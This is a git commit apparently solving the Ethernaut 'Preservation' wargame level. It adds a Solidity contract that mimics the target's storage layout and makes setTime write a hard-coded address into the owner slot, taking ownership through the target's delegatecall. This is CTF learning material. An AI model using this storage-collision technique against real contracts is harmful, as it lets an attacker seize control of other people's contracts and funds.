259a1dafb8be2618e836c73c524df4c2068ba312
Nicolas Montalbano <nicolasignacio.montalbano@gmail.com>
2022-11-29 21:02:17 -0300

    Level 16 - Preservation

---
+++ Level 16 - Preservation/PreservationHack.sol
@@ -0,0 +1,14 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract Preservation {
+
+    address public timeZone1Library;
+    address public timeZone2Library;
+    address public owner; 
+
+
+    function setTime(uint256 _timeStamp) public {
+        owner = 0x69Eee4B26f7fc5D67e1e17dFE8b082410dEb1a16;
+    }
+}
